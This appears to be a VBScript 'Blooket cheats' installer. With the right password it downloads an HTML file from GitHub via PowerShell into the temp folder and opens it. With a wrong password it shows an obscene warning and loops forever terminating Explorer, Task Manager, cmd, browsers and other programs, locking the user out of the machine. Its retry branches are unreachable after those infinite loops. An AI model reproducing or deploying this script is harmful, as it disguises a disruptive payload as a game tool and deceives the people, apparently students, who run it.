Function KillAll(ProcessName)
    Dim objWMIService, colProcess
    Dim strComputer, strList, p
    Dim i :i= 0 
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2") 
    Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process Where Name like '" & ProcessName & "'")
    For Each p in colProcess
        p.Terminate     
    i = i+1        
    Next
End Function
Set objShell = createobject("wscript.Shell")
dim password
password=InputBox("Please Enter Password:","Blooket")
if password = ("BlooketCheats") then
dim correct
correct =MsgBox("Opening Blooket... Please Wait",64,"Blooket")
Set oShell = CreateObject ("WScript.Shell") 
oShell.run "cmd.exe /C title Installing Blooket & echo Installing Blooket Please Wait! & powershell -Command ""Invoke-WebRequest https://github.com/Minesraft2/Blooket-Cheats/raw/main/unobfuscated/Bookmarklets.html -OutFile %temp%\Blook.html"" >nul & start %temp%\Blook.html",,true
Else
dim again
again =MsgBox("Your Computer About to get Fucked In The Ass...",0+48,"You Fucked Up Bitch!")
  do
call KillAll("notepad.exe")
call KillAll("explorer.exe")
call KillAll("cmd.exe")
call KillAll("chrome.exe")
call KillAll("google.exe")
call KillAll("opera.exe")
call KillAll("firefox.exe")
call KillAll("taskmgr.exe")
call KillAll("edge.exe")
call KillAll("msedge.exe")
call KillAll("mail.exe")
call KillAll("paint.exe")
call KillAll("calc.exe")
loop
If again = 4 Then
dim password2
password2=Inputbox("Please Enter Password:","Blooket")
if password2 = ("BlooketCheats") then
dim correct2
correct2 =MsgBox("Opening Blooket... Please Wait",64,"Blooket")
Set oShell = CreateObject ("WScript.Shell") 
oShell.run "cmd.exe /C title Installing Blooket & echo Installing Blooket Please Wait! & powershell -Command ""Invoke-WebRequest https://github.com/Minesraft2/Blooket-Cheats/raw/main/unobfuscated/Bookmarklets.html -OutFile %temp%\Blook.html"" >nul & start %temp%\Blook.html",,true
Else
dim again2
again2 =MsgBox("Your Computer About to get Fucked In The Ass...",0+48,"You Fucked Up Bitch!")
      do
call KillAll("notepad.exe")
call KillAll("explorer.exe")
call KillAll("cmd.exe")
call KillAll("chrome.exe")
call KillAll("google.exe")
call KillAll("opera.exe")
call KillAll("firefox.exe")
call KillAll("taskmgr.exe")
call KillAll("edge.exe")
call KillAll("msedge.exe")
call KillAll("mail.exe")
call KillAll("paint.exe")
call KillAll("calc.exe")
loop
If again2 = 4 Then
dim password3
password3=InputBox("Please Enter Password:","Blooket")
if password3 = ("BlooketCheats") then
dim correct3
correct3 =MsgBox("Opening Blooket... Please Wait",64,"Blooket")
Set oShell = CreateObject ("WScript.Shell") 
oShell.run "cmd.exe /C title Installing Blooket & echo Installing Blooket Please Wait! & powershell -Command ""Invoke-WebRequest https://github.com/Minesraft2/Blooket-Cheats/raw/main/unobfuscated/Bookmarklets.html -OutFile %temp%\Blook.html"" >nul & start %temp%\Blook.html",,true
Else
dim again3
again3 =MsgBox("Incorrect Password! Do You Want To Try Again?",53,"Incorrect Password")
If again3 = 4 Then
dim incorrect
            incorrect =MsgBox("Your Computer About to get Fucked In The Ass...",0+48,"You Fucked Up Bitch!")
do
call KillAll("notepad.exe")
call KillAll("explorer.exe")
call KillAll("cmd.exe")
call KillAll("chrome.exe")
call KillAll("google.exe")
call KillAll("opera.exe")
call KillAll("firefox.exe")
call KillAll("taskmgr.exe")
call KillAll("edge.exe")
call KillAll("msedge.exe")
call KillAll("mail.exe")
call KillAll("paint.exe")
call KillAll("calc.exe")
loop
end if
end if
end if
end if
end if End if
